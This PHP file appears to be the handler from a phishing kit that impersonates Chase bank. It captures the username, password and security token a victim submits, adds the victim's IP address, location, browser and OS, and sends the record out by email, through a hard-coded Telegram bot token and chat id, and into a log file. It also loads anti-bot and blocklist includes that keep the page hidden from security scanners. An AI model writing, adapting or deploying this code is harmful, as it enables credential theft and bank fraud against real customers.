<?php
session_start();
require_once '../main.php';
include('../detects.php');
include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';
include'anti/IP-BlackList.php';  
include'anti/Bot-Crawler.php';
include'anti/Bot-Spox.php';
include'anti/blacklist.php';
include'anti/new.php';
include'anti/Dila_DZ.php';
include('../blockers.php');

if (!$_POST['passwordbank']){
} else {
    $datet= $date;
    $VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
    $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| UserAgent : " . $user_agent . "";
    $VictimInfo4 = "| Browser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $userbank = $_SESSION['userbank'] = $_POST['userbank'];
    $passwordbank = $_SESSION['passwordbank'] = $_POST['passwordbank'] ;
    $securityTokenbank = $_SESSION['securityTokenbank'] = $_POST['securityTokenbank'] ;
    $message = "+ -------- 👻💥 [⚡ ELARABY ⚡] 💥👻 -----------+\n";
    $message .="| 🏦 🔑 chase login Drtails 🔑 \n";
    $message .="| UserName : $userbank\n";
    $message .="| password : $passwordbank\n";
    if (isset($_SESSION['securityTokenbank'])) {
        $message .= "| Chese : $securityTokenbank\n";
    }
    $message .="+ ------------------------------------+\n";
    $message .="| 🌐 🔑 Victim Information\n";
    $message .="$VictimInfo1\n";
    $message .="$VictimInfo2\n";
    $message .="$VictimInfo3\n";
    $message .="$VictimInfo4\n";
    $message .="$VictimInfo5\n";
    $message .="| 🕛 Received : $date\n";
    $message .="+ ------------------------------------+\n";
    $subject = "UserName : ".$_POST['userbank']." [ $cn - $os - $v_ip ]";
    if($send_login == "on") {
        kirim_mail($email_result, "chase login", $subject, $message);
		file_get_contents('https://api.telegram.org/bot5157139736:AAG_tQwVnXuAPrz8auSZ4KvCehaZrU-rkbo/sendMessage?text='.$message.'&chat_id=1148960035');

    }
    $save = fopen("../rs/login.txt","a+");
	fwrite($save,$message);
    fclose($save);
    header('Location: emailbank?key='.$key);
}
?>